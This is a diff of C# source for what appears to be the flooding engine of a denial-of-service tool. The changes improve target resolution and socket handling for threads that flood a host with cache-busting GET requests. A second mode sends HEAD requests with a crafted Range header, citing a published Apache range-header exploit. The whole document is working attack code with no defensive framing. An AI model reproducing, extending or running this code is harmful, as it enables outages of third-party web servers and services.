@@ -11,7 +11,8 @@ namespace GAS.Core
     {
         #region Variables
         bool init = false;
-        public IPAddress IP, DNS;
+        public IPAddress IP;
+        public string DNS;
         public string Subsite;
         private Random rnd = new Random();
         private bool random, usegZip, IPOrDns = true, Resp;
@@ -24,14 +25,18 @@ namespace GAS.Core
             ThreadCount = threadcount;
             WorkingThreads = new Thread[ThreadCount];
             this.IsDelayed = false;
-            try { this.DNS = IPAddress.Parse(dns); }
-            catch { this.DNS = this.IP; }
             try { this.IP = IPAddress.Parse(ip); }
             catch
             {
-                this.IP = null;
-                this.IPOrDns = false;
+                try
+                {
+                    this.IP = Dns.GetHostAddresses(dns)[0];
+                }
+                catch { this.IPOrDns = false; }
+                //this.IPOrDns = false;
             }
+            try { this.DNS = dns; }
+            catch { this.DNS = this.IP.ToString(); }
             this.Port = port;
             this.Subsite = subSite;
             this.Resp = resp;
@@ -82,12 +87,31 @@ namespace GAS.Core
                     States[MY_INDEX_FOR_WORK] =  ReqState.Ready;
                     recvBuf = new byte[bfsize];
                     #region Connect
-                    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                    rSocket socket = new rSocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                     States[MY_INDEX_FOR_WORK] = ReqState.Connecting;
-                    try { socket.Connect(this.IPOrDns ? IP : DNS, Port); } catch { continue; }
+                    #region Blocking IO
+                        try { socket.Connect(this.IPOrDns ? this.IP.ToString() : this.DNS, this.Port); } catch { continue; }
+                    #endregion
+                    #region Async IO
+                    /*
+                        try
+                        {
+                            var a = new SocketAsyncEventArgs()
+                            {
+                                RemoteEndPoint = new IPEndPoint(this.IPOrDns ? IP : Dns.GetHostAddresses(this.DNS)[0], this.Port)
+
+                            };
+                            a.Completed+=
+                            socket.ConnectAsync(a);
+                        }
+                        catch { }*/
+                    #endregion
                     socket.Blocking = Resp;
                     States[MY_INDEX_FOR_WORK] = ReqState.Requesting;
-                    socket.Send(buf, SocketFlags.None);
+                    #region Blocking IO
+                        try { socket.Send(buf, SocketFlags.None); }
+                        catch { }
+                    #endregion
                     //socket.SendAsync(buf, SocketFlags.None);
                     #endregion
                     States[MY_INDEX_FOR_WORK] = ReqState.Downloading;
@@ -98,8 +122,10 @@ namespace GAS.Core
                             try
                             {
                                 recvd = 0;
+                                #region Blocking IO
                                 do { recvd = socket.Receive(recvBuf); }
                                 while (false);//(recvd > bfsize) && socket.Connected);
+                                #endregion
                                 Downloaded++;
                             }
                             catch { Failed++; }
@@ -108,9 +134,10 @@ namespace GAS.Core
                         States[MY_INDEX_FOR_WORK] = ReqState.Completed; 
                         Downloaded++;
                     if (Delay > 0) System.Threading.Thread.Sleep(Delay + 1);
+                    socket.Dispose();
                 }
                 #endregion
-            }
+            } 
             catch { }
             finally {}            
         }
@@ -118,8 +145,9 @@ namespace GAS.Core
         {
             if (this._attacktype == 0)
                 return System.Text.Encoding.ASCII.GetBytes(
-                 String.Format(random ? "GET {0}{1} HTTP/1.1\r\nHost: {2}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n{3}\r\n" :
-                                       "GET {0} HTTP/1.1\r\nHost: {2}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n{3}\r\n",
+                 String.Format(random ? 
+                 "GET {0}{1} HTTP/1.1\r\nHost: {2}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n{3}\r\n" :                                       
+                 "GET {0} HTTP/1.1\r\nHost: {2}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n{3}\r\n",
                                        Subsite,
                                        Functions.RandomString(),
                                        DNS,
@@ -130,7 +158,8 @@ namespace GAS.Core
 
                 //http://1337day.com/exploits/16729
                 return System.Text.Encoding.ASCII.GetBytes(
-                    String.Format("HEAD {0}{1} HTTP/1.1{4}Accept: */*{4}User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0){4}{3}Host: {2}{4}{4}Range:bytes=0-{5}{4}Connection: close{4}{4}",
+                    String.Format(
+"HEAD {0}{1} HTTP/1.1{4}Accept: */*{4}User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0){4}{3}Host: {2}{4}{4}Range:bytes=0-{5}{4}Connection: close{4}{4}",
                             Subsite,
                             (random ? Functions.RandomString() : null),
                             DNS,
@@ -144,14 +173,7 @@ namespace GAS.Core
             IsFlooding = false;
             try
             {
-                foreach (var x in WorkingThreads)
-                {
-                    try
-                    {
-                        x.Abort();
-                    }
-                    catch { }
-                }
+                foreach (var x in WorkingThreads) { try { x.Abort(); } catch { } }
             }
             catch { }
         }
